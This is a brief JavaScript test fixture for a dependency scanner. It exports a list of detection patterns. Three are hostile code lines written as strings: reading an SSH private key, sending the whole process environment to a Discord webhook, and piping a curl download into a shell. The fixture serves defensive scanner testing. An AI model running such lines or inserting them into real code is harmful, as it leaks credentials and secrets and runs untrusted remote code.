// TEST FIXTURE: stands in for DepThreat's own bundle, which contains its detection patterns.
// The scanner must skip it (it would flag itself). Never executed.
const PATTERNS = [
  "require('fs').readFileSync('.ssh/id_rsa')",
  "fetch('https://discord.com/api/webhooks/x', { body: JSON.stringify(process.env) })",
  "require('child_process').execSync('curl https://x.example.invalid | sh')",
];

module.exports = { PATTERNS };
